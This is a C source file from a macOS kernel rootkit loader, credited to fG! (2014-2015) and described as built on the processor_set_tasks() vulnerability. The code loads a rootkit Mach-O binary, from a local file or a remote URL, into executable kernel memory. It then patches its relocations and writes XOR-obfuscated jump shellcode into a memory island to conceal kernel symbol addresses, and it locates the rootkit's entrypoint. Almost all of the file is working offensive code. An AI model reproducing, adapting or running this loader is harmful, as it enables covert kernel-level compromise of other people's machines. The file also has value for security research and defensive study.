/*
 *  _(`-')     _     (`-')  _           <-. (`-')_             (`-').->(`-')      _
 * ( (OO ).-> (_)    (OO ).-/     .->      \( OO) )     .->    ( OO)_  ( OO).->  (_)     _
 *  \    .'_  ,-(`-')/ ,---.   ,---(`-'),--./ ,--/ (`-')----. (_)--\_) /    '._  ,-(`-') \-,-----.
 *  '`'-..__) | ( OO)| \ /`.\ '  .-(OO )|   \ |  | ( OO).-.  '/    _ / |'--...__)| ( OO)  |  .--./
 *  |  |  ' | |  |  )'-'|_.' ||  | .-, \|  . '|  |)( _) | |  |\_..`--. `--.  .--'|  |  ) /_) (`-')
 *  |  |  / :(|  |_/(|  .-.  ||  | '.(_/|  |\    |  \|  |)|  |.-._)   \   |  |  (|  |_/  ||  |OO )
 *  |  '-'  / |  |'->|  | |  ||  '-'  | |  | \   |   '  '-'  '\       /   |  |   |  |'->(_'  '--'\
 *  `------'  `--'   `--' `--' `-----'  `--'  `--'    `-----'  `-----'    `--'   `--'      `-----'
 *  (`-').->(`-')  _   (`-')       (`-')  _                (`-')  _
 *  ( OO)_  ( OO).-/<-.(OO )      _(OO ) (_)     _         ( OO).-/
 * (_)--\_)(,------.,------,),--.(_/,-.\ ,-(`-') \-,-----.(,------.
 * /    _ / |  .---'|   /`. '\   \ / (_/ | ( OO)  |  .--./ |  .---'
 * \_..`--.(|  '--. |  |_.' | \   /   /  |  |  ) /_) (`-')(|  '--.
 * .-._)   \|  .--' |  .   .'_ \     /_)(|  |_/  ||  |OO ) |  .--'
 * \       /|  `---.|  |\  \ \-'\   /    |  |'->(_'  '--'\ |  `---.
 *  `-----' `------'`--' '--'    `-'     `--'      `-----' `------'
 *
 * A kernel rootkit loader based on processor_set_tasks() vulnerability
 *
 * Copyright (c) fG!, 2014, 2015. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * rootkit.c
 * Functions related to load and execute the rootkit into kernel memory
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "rootkit.h"

#include <stdio.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <mach/processor_set.h>
#include <mach/mach_vm.h>
#include <sys/param.h>
#include <mach/mach.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/mman.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/reloc.h>
#include <mach-o/x86_64/reloc.h>

#include "logging.h"
#include "utils.h"
#include "kernel_symbols.h"
#include "remote.h"

/* some local structure to make things easier to reference */
struct reloc_info
{
    struct dysymtab_command *dysymtab;
    struct symtab_command *symtab;
};

static char * find_symbol_by_nr(uint8_t *buffer, struct reloc_info *ri, int sym_number);
static uint32_t get_rootkit_mem_size(const uint8_t *buffer);
static int copy_rootkit_to_kmem(mach_port_t kernel_port, mach_vm_address_t rootkit_addr, const uint8_t *buffer);
static kern_return_t process_rootkit_relocations(mach_port_t kernel_port, uint8_t *buffer, struct kernel_info *kinfo, mach_vm_address_t rootkit_address);
static mach_vm_address_t find_rootkit_entrypoint(uint8_t *buffer);
static kern_return_t map_local_rootkit(const char *filename, uint8_t **buffer, size_t *size);
static kern_return_t unmap_local_rootkit(uint8_t *buffer, size_t size);

#pragma mark -
#pragma mark Exported functions

kern_return_t
install_rootkit(mach_port_t kernel_port, const char *filename, struct kernel_info *kinfo, mach_vm_address_t *rootkit_addr, mach_vm_address_t *rootkit_entrypoint)
{
    OUTPUT_MSG("\n-----[ Installing rootkit into kernel memory ]-----");

    if (!MACH_PORT_VALID(kernel_port) || filename == NULL)
    {
        ERROR_MSG("Invalid arguments.");
        return KERN_FAILURE;
    }
    
    int fd = -1;
    uint8_t *rootkit_buffer = NULL;
    size_t mapped_size = 0;
    int file_mapped = 0;
    
    if (strncmp(filename, "http://", 7) == 0 ||
        strncmp(filename, "https://", 8) == 0)
    {
        if (download_remote_rootkit(&rootkit_buffer, filename) != 0)
        {
            ERROR_MSG("Failed to retrieve remote rootkit payload.");
            return KERN_FAILURE;
        }
    }
    else
    {
        OUTPUT_MSG("\n-----[ Retrieving rootkit payload from local file... ]-----");
        if (map_local_rootkit(filename, &rootkit_buffer, &mapped_size) != KERN_SUCCESS)
        {
            ERROR_MSG("Failed to map local rootkit payload.");
            return KERN_FAILURE;
        }
        file_mapped = 1;
    }

    /* allocate kernel memory */
    kern_return_t kr = 0;
    mach_vm_address_t alloc_addr = 0;
    mach_vm_address_t entrypoint = 0;
    /* we need to find the total size of the rootkit in memory
     * and not the size on disk because of aligment
     */
    uint32_t rootkit_size = get_rootkit_mem_size(rootkit_buffer);
    if (rootkit_size == 0)
    {
        ERROR_MSG("Failed to retrieve rootkit memory size");
        goto failure;
    }
    
    kr = alloc_exec_kmem(kernel_port, (uint64_t)rootkit_size, &alloc_addr);
    if (kr != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to allocate space for rootkit: %x.", kr);
        goto failure;
    }
    DEBUG_MSG("Allocated %d bytes for rootkit at kernel address 0x%llx", rootkit_size, alloc_addr);
    
    /* two steps:
     * 1 - copy rootkit to kernel memory
     * 2 - fix relocations so external symbols point to the correct places
     * Note: these steps can be swapped since we can fix the relocations in userland before
     *       uploading to the kernel memory - process_rootkit_relocations() needs to be
     *       modified to support that case
     */

    /* now copy rootkit to kernel memory */
    /* memory protections and wired status set inside */
    if (copy_rootkit_to_kmem(kernel_port, alloc_addr, rootkit_buffer) != 0)
    {
        ERROR_MSG("Failed to copy rootkit to kernel memory.");
        goto failure;
    }
    
    /*  we need to fix relocations else we wil have ugly crashes */
    if (process_rootkit_relocations(kernel_port, rootkit_buffer, kinfo, alloc_addr) != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to fix rootkit relocations!");
        goto failure;
    }
    /* find the entrypoint to add to TrustedBSD policy */
    entrypoint = find_rootkit_entrypoint(rootkit_buffer);
    if  (entrypoint == 0)
    {
        ERROR_MSG("Failed to find rootkit entrypoint!");
        goto failure;
    }
    DEBUG_MSG("Rootkit entrypoint is 0x%llx", entrypoint);

end:
    /* cleanup */
    close(fd);
    if (file_mapped)
    {
        unmap_local_rootkit(rootkit_buffer, mapped_size);
    }
    /* set out parameters */
    *rootkit_addr = alloc_addr;
    *rootkit_entrypoint = entrypoint;
    return KERN_SUCCESS;
    
failure:
    close(fd);
    if (file_mapped)
    {
        unmap_local_rootkit(rootkit_buffer, mapped_size);
    }
    return KERN_FAILURE;
}

#pragma mark -
#pragma mark Local functions

static kern_return_t
map_local_rootkit(const char *filename, uint8_t **buffer, size_t *size)
{
    int fd = -1;
    
    fd = open(filename, O_RDONLY);
    if (fd < 0)
    {
        ERROR_MSG("Failed to open rootkit file: %s.", strerror(errno));
        return KERN_FAILURE;
    }
    
    struct stat statbuf = {0};
    if ( fstat(fd, &statbuf) < 0 )
    {
        ERROR_MSG("Can't fstat file: %s", strerror(errno));
        close(fd);
        return KERN_FAILURE;
    }
    
    if ( (*buffer = mmap(0, statbuf.st_size, PROT_READ, MAP_SHARED, fd, 0)) == MAP_FAILED)
    {
        ERROR_MSG("Mmap failed on file: %s", strerror(errno));
        close(fd);
        return KERN_FAILURE;
    }
    return KERN_SUCCESS;
}

static kern_return_t
unmap_local_rootkit(uint8_t *buffer, size_t size)
{
    if (buffer)
    {
        munmap(buffer, size);
    }
    return KERN_SUCCESS;
}

static kern_return_t
process_rootkit_relocations(mach_port_t kernel_port, uint8_t *buffer, struct kernel_info *kinfo, mach_vm_address_t rootkit_address)
{
    OUTPUT_MSG("\n-----[ Processing rootkit relocations ]-----");
    
    if (buffer == NULL || kinfo == NULL || !MACH_PORT_VALID(kernel_port))
    {
        ERROR_MSG("Invalid arguments.");
        return KERN_FAILURE;
    }
    
    struct mach_header_64 *mh = (struct mach_header_64*)buffer;
    if (mh->magic != MH_MAGIC_64)
    {
        ERROR_MSG("Rootkit is not 64 bits or invalid file!");
        return KERN_FAILURE;
    }
    
    if (mh->ncmds == 0 || mh->sizeofcmds == 0)
    {
        ERROR_MSG("Invalid number of commands or size.");
        return KERN_FAILURE;
    }
    
    /* process header to find location of necessary info */
    struct load_command *lc = (struct load_command*)(buffer + sizeof(struct mach_header_64));
    
    struct reloc_info rk_header_info = {0};
    
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        if (lc->cmd == LC_DYSYMTAB)
        {
            struct dysymtab_command *cmd = (struct dysymtab_command*)lc;
            rk_header_info.dysymtab = cmd;
        }
        else if (lc->cmd == LC_SYMTAB)
        {
            struct symtab_command *cmd = (struct symtab_command*)lc;
            rk_header_info.symtab = cmd;
        }
        lc = (struct load_command*)((char*)lc + lc->cmdsize);
    }
    
    /* make sure we have valid information */
    if (rk_header_info.dysymtab == NULL ||
        rk_header_info.symtab == NULL)
    {
        ERROR_MSG("No header info available.");
        return KERN_FAILURE;
    }
    
    /* now process external relocations table and fix the symbols in kernel memory */
    /* nextrel is the number of external relocations we need to fix */
    /* we only fix the relocations of type X86_64_RELOC_BRANCH */
    /* they refer to "a CALL/JMP instruction with 32-bit displacement" */
    /* check mach-o/x86_64/reloc.h */
    DEBUG_MSG("Number of external relocation entries found in rootkit: %d", rk_header_info.dysymtab->nextrel);

    /*
     * NOTE:
     * in machines with lots of memory there's no guarantee that the offset from kernel
     * to the memory allocated for the rootkit will fit in a int32
     * if it doesn't we can't solve the relocations because the offset is only 32 bits
     * a solution is to allocate an intermediate island that then uses absolute addresses to jump to kernel symbol
     * the relocation entry instead of jumping to kernel symbol jumps to island and then to kernel symbol
     */
     
    /* lame shellcode to jump to symbol address avoiding int32 offset issues */
    /* uses a simple xor obfuscation to hide the target symbol */
    /* XXX: can be vastly improved ;-) */
    uint8_t shellcode[] =
    "\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00"  // mov rax, 0x0
    "\x48\xBB\x00\x00\x00\x00\x00\x00\x00\x00"  // mov rbx, key
    "\x48\x31\xD8"                              // xor rax, rbx
    "\xFF\xE0";                                 // jmp rax

    size_t shellcode_size = sizeof(shellcode) - 1;
    /* allocate an island where we write the shellcode for each symbol */
    size_t island_size = mach_vm_round_page(shellcode_size * rk_header_info.dysymtab->nextrel);
    DEBUG_MSG("Island size is 0x%lx", island_size);
    /* NOTE: the rootkit should be aware of this value if we want to cleanup later inside the rootkit */
    mach_vm_address_t island_addr = 0;
    if (alloc_exec_kmem(kernel_port, island_size, &island_addr) != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to allocate island.");
        return KERN_FAILURE;
    }
    
    for (uint32_t i = 0; i < rk_header_info.dysymtab->nextrel; i++)
    {
        /* this structure contains the information for each relocation */
        struct relocation_info *rel = (struct relocation_info*)(buffer + rk_header_info.dysymtab->extreloff + i * sizeof(struct relocation_info));

        /* find the name of the current symbol in relocation table */
        char *symbol = find_symbol_by_nr(buffer, &rk_header_info, rel->r_symbolnum);
        if (symbol == NULL)
        {
            continue;
        }
//        DEBUG_MSG("Symbol name: %s Original rootkit address:0x%x Extern:%x Length:%x PCRelative:%x Symbol nr:%d Type:%x", symbol, rel->r_address, rel->r_extern, rel->r_length, rel->r_pcrel, rel->r_symbolnum, rel->r_type);

        /* r_length: 0=byte, 1=word, 2=long, 3=quad */
        mach_msg_type_number_t write_size = 1 << rel->r_length;
        /* find the symbol address in kernel */
        /* this is the address we are going to fix to in the rootkit */
        mach_vm_address_t sym_addr = solve_kernel_symbol(kinfo, symbol);
        DEBUG_MSG("Kernel symbol %s is located at 0x%llx", symbol, sym_addr);
        DEBUG_MSG("Relocation offset address 0x%llx of type %d", rootkit_address + rel->r_address, rel->r_type);
        
        /* the only two types that are used are X86_64_RELOC_BRANCH and X86_64_RELOC_UNSIGNED */
        /* this info was gathered by processing all system kexts */
        
        /* XXX: fix the cases where there is a 4 bytes addend */
        /* doesn't seem to apply to kernel extensions? */
        if (rel->r_type == X86_64_RELOC_BRANCH)
        {
            uint64_t base_address = rootkit_address + rel->r_address + write_size;
            /* the offset from the rootkit relocation entry to the current position in the island */
            int64_t offset2 = (int64_t)(island_addr - base_address);
            
            if (offset2 > INT32_MAX ||
                offset2 < INT32_MIN)
            {
                DEBUG_MSG("Offset is %llx", offset2);
                ERROR_MSG("Offset to island for symbol %s doesn't fit in signed integer!", symbol);
                zero_and_dealloc_kmem(kernel_port, island_addr, (uint32_t)island_size);
                return KERN_FAILURE;
            }
            int32_t offset = (int32_t)offset2;
            
            /* r_address points to the offset portion of the CALL instruction so it's always 1 byte ahead of the start of instruction address */
            /* this fixes the relocation offset into the rootkit instruction */
            /* in this case it points to an entry in the island */
            kern_return_t kr = mach_vm_write(kernel_port, (mach_vm_address_t)(rootkit_address + rel->r_address), (vm_offset_t)&offset, write_size);
            if (kr != KERN_SUCCESS)
            {
                ERROR_MSG("Failed to write new X86_64_RELOC_BRANCH relocation for symbol %s", symbol);
                zero_and_dealloc_kmem(kernel_port, island_addr, (uint32_t)island_size);
                return KERN_FAILURE;
            }
            /* generate a 64 bits xor key for each relocation entry */
            uint64_t xor_key = (uint64_t)(arc4random() % ((unsigned)RAND_MAX + 1)) << 32 | (arc4random() % ((unsigned)RAND_MAX + 1));
            /* obfuscate the symbol address */
            mach_vm_address_t xored_sym_addr = sym_addr ^ xor_key;
            /* fix the shellcode, first with the obfuscated symbol address, next with the key */
            memcpy(shellcode + 2, &xored_sym_addr, sizeof(uint64_t));
            memcpy(shellcode + 12, &xor_key, sizeof(uint64_t));
            /* finally write the shellcode to the island */
            kr = mach_vm_write(kernel_port, (mach_vm_address_t)island_addr, (vm_offset_t)shellcode, (mach_msg_type_number_t)shellcode_size);
            if (kr != KERN_SUCCESS)
            {
                ERROR_MSG("Failed to write new X86_64_RELOC_BRANCH relocation for symbol %s", symbol);
                zero_and_dealloc_kmem(kernel_port, island_addr, (uint32_t)island_size);
                return KERN_FAILURE;
            }
            /* advance to next position in the island */
            island_addr += shellcode_size;
#if 0
            /* check if write was successful */
            uint32_t result = 0;
            readkmem(kernel_port, &result, rootkit_address + rel->r_address - 1, sizeof(result));
            DEBUG_MSG("content %x", result);
#endif
        }
        /* these are absolute addresses so we just need to write the new address */
        else if (rel->r_type == X86_64_RELOC_UNSIGNED)
        {
            kern_return_t kr = mach_vm_write(kernel_port, (mach_vm_address_t)(rootkit_address + rel->r_address), (vm_offset_t)&sym_addr, write_size);
            if (kr != KERN_SUCCESS)
            {
                ERROR_MSG("Failed to write new X86_64_RELOC_UNSIGNED relocation for symbol %s", symbol);
                zero_and_dealloc_kmem(kernel_port, island_addr, (uint32_t)island_size);
                return KERN_FAILURE;
            }
        }
    }
    
    /* we also need to fix local relocations, used for strings and some other symbols */
    DEBUG_MSG("Number of local relocation entries found in rootkit: %d", rk_header_info.dysymtab->nlocrel);
    /* process local relocations */
    /* these are easier because they are all of type X86_64_RELOC_UNSIGNED aka absolute */
    /* we don't even care about what symbols they belong to */
    for (uint32_t i = 0; i < rk_header_info.dysymtab->nlocrel; i++)
    {
        /* this structure contains the information for each relocation */
        struct relocation_info *rel = (struct relocation_info*)(buffer + rk_header_info.dysymtab->locreloff + i * sizeof(struct relocation_info));
        /* guarantee we just process these */
        if (rel->r_extern == 0 && rel->r_pcrel == 0 && rel->r_type == X86_64_RELOC_UNSIGNED)
        {
            /* we need to read the original value and rebase it with rootkit load address */
            mach_vm_address_t target_addr = rootkit_address + *(mach_vm_address_t*)(buffer + rel->r_address);
//            DEBUG_MSG("Fixing local relocation #%d to address 0x%llx", i, target_addr);
            /* and then rewrite the value to the fixed absolute address */
            kern_return_t kr = mach_vm_write(kernel_port, (mach_vm_address_t)(rootkit_address + rel->r_address), (vm_offset_t)&target_addr, sizeof(target_addr));
            if (kr != KERN_SUCCESS)
            {
                ERROR_MSG("Failed to write new X86_64_RELOC_UNSIGNED local relocation #%d", i);
                zero_and_dealloc_kmem(kernel_port, island_addr, (uint32_t)island_size);
                return KERN_FAILURE;
            }
        }
    }

    return KERN_SUCCESS;
}

/* find the rootkit entrypoint address which is start() that then loads up the real_main address
 * which is the one we define as _start in the source code
 */
static mach_vm_address_t
find_rootkit_entrypoint(uint8_t *buffer)
{
    OUTPUT_MSG("\n-----[ Locating rootkit entrypoint ]-----");
    
    if (buffer == NULL)
    {
        ERROR_MSG("Invalid arguments.");
        return 0;
    }
    
    struct mach_header_64 *mh = (struct mach_header_64*)buffer;
    if (mh->magic != MH_MAGIC_64)
    {
        ERROR_MSG("Rootkit is not 64 bits or invalid file!");
        return 0;
    }
    
    if (mh->ncmds == 0 || mh->sizeofcmds == 0)
    {
        ERROR_MSG("Invalid number of commands or size.");
        return 0;
    }

    /* process header to find location of necessary info */
    struct load_command *lc = (struct load_command*)(buffer + sizeof(struct mach_header_64));
    
    struct symtab_command *symtab = NULL;
    
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        /* we just need this for symbol information */
        if (lc->cmd == LC_SYMTAB)
        {
            struct symtab_command *cmd = (struct symtab_command*)lc;
            symtab = cmd;
            break;
        }
        lc = (struct load_command*)((char*)lc + lc->cmdsize);
    }
    
    if (symtab == NULL)
    {
        ERROR_MSG("No symbol information available!");
        return 0;
    }
    
    mach_vm_address_t entrypoint = 0;
    struct nlist_64 *nlist = NULL;
    for (uint32_t i = 0; i < symtab->nsyms; i++)
    {
        nlist = (struct nlist_64*)(buffer + symtab->symoff + i * sizeof(struct nlist_64));
        char *symbol_string = (char*)(buffer + symtab->stroff + nlist->n_un.n_strx);
        if ( (strcmp(symbol_string, "_kmod_info") == 0) && (nlist->n_value != 0) )
        {
            DEBUG_MSG("Found kmod_info at 0x%llx", nlist->n_value);
            /* includes say to use the compatibility structure */
            kmod_info_64_v1_t *kmod = (kmod_info_64_v1_t*)((char*)buffer + nlist->n_value);
            DEBUG_MSG("Kernel extension start function address: 0x%llx", (mach_vm_address_t)kmod->start_addr);
            entrypoint = (mach_vm_address_t)kmod->start_addr;
            break;
        }
    }

    return entrypoint;
}

/* return the symbol string correspondent to the symbol number
 * this is because relocations refers to the symbol number so we need to lookup the corresponding string
 */
static char *
find_symbol_by_nr(uint8_t *buffer, struct reloc_info *ri, int sym_number)
{
    if (buffer == NULL ||  ri == NULL)
    {
        ERROR_MSG("Invalid arguments.");
        return NULL;
    }
    /* make sure the request isn't out of bounds */
    if (sym_number > ri->symtab->nsyms)
    {
        ERROR_MSG("Out of bounds symbol number!");
        return NULL;
    }
    
    struct nlist_64 *nlist = NULL;
    nlist = (struct nlist_64*)((char*)buffer + ri->symtab->symoff + sym_number * sizeof(struct nlist_64));
    char *symbol_string = (char*)((char*)buffer + ri->symtab->stroff + nlist->n_un.n_strx);
    
    return symbol_string;
}

static uint32_t
get_rootkit_mem_size(const uint8_t *buffer)
{
    if (buffer == NULL)
    {
        ERROR_MSG("Invalid arguments.");
        return 0;
    }
    
    uint32_t rootkit_size = 0;
    
    struct mach_header_64 *mh = (struct mach_header_64*)buffer;
    if (mh->magic != MH_MAGIC_64)
    {
        ERROR_MSG("Rootkit is not 64 bits or invalid file!");
        return 0;
    }
    
    if (mh->ncmds == 0 || mh->sizeofcmds == 0)
    {
        ERROR_MSG("Invalid number of commands or size.");
        return 0;
    }

    /* process header to compute necessary rootkit size in memory */
    struct load_command *lc = (struct load_command*)(buffer + sizeof(struct mach_header_64));
    int nr_seg_cmds = 0;
    
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        if (lc->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *sc = (struct segment_command_64*)lc;
            rootkit_size += sc->vmsize;
            nr_seg_cmds++;
        }
        lc = (struct load_command*)((char*)lc + lc->cmdsize);
    }
    
    DEBUG_MSG("Processed %d segment commands", nr_seg_cmds);
    return rootkit_size;
}

static int
copy_rootkit_to_kmem(mach_port_t kernel_port, mach_vm_address_t rootkit_addr, const uint8_t *buffer)
{
    if (!MACH_PORT_VALID(kernel_port) || rootkit_addr == 0 || buffer == NULL)
    {
        ERROR_MSG("Invalid arguments.");
        return -1;
    }
    
    kern_return_t kr = 0;
    
    struct mach_header_64 *mh = (struct mach_header_64*)buffer;
    if (mh->magic != MH_MAGIC_64)
    {
        ERROR_MSG("Rootkit is not 64 bits or invalid file!");
        return 0;
    }

    /* process header to compute necessary rootkit size in memory */
    struct load_command *lc = (struct load_command*)(buffer + sizeof(struct mach_header_64));

    if (mh->ncmds == 0 || mh->sizeofcmds == 0)
    {
        ERROR_MSG("Invalid number of commands or size.");
        return -1;
    }
    
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        /* the segment commands are the ones mapped into memory - symbol data is inside __LINKEDIT */
        if (lc->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *sc = (struct segment_command_64*)lc;
            /* NOTE: we are creating a hole in allocated memory because we just copy the LC_SEGMENTs
             *       and not the header for example
             */
            mach_vm_address_t target_addr = rootkit_addr + sc->vmaddr;
            /* the buffer offset positions from the file offset where data is */
            uint8_t *source_buffer = (uint8_t*)buffer + sc->fileoff;
            DEBUG_MSG("Target address 0x%llx siuze 0x%llx filesize: 0x%llx", target_addr, sc->vmsize, sc->filesize);
            /* write the data to kernel memory - size is from filesize since remainder is alignment data */
            kr = mach_vm_write(kernel_port, target_addr, (vm_offset_t)source_buffer, (mach_msg_type_number_t)sc->filesize);
            if (kr != KERN_SUCCESS)
            {
                ERROR_MSG("Failed to copy rootkit segment %s. Error: %d.", sc->segname, kr);
                return -1;
            }
            /* NOTE:
             * this is not necessary anymore because the alloc_* auxiliary functions already set memory wired
             * just left here for historical/example purposes
             */
#if 0
            /* change memory protection of data we just wrote to kernel - size is from vmsize since we protect all allocated memory */
            kr = mach_vm_protect(kernel_port, target_addr, (mach_vm_size_t)sc->vmsize, 0, VM_PROT_ALL);
            if (kr != KERN_SUCCESS)
            {
                DEBUG_MSG("Failed to change memory protection on rootkit segment %s. Error: %d", sc->segname, kr);
                return -1;
            }
            /* make this memory physically wired
             * without this we will most probably land into page faults nightmares because not everything will be paged in
             * we must first change memory protection above and then set the wire status
             */
            kr = mach_vm_wire(mach_host_self(), kernel_port, target_addr, sc->vmsize, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
            if (kr != KERN_SUCCESS)
            {
                ERROR_MSG("Failed to make memory wired on rootkit segment %s. Error %d", sc->segname, kr);
                return -1;
            }
#endif
        }
        lc = (struct load_command*)((char*)lc + lc->cmdsize);
    }
    
    return 0;
}
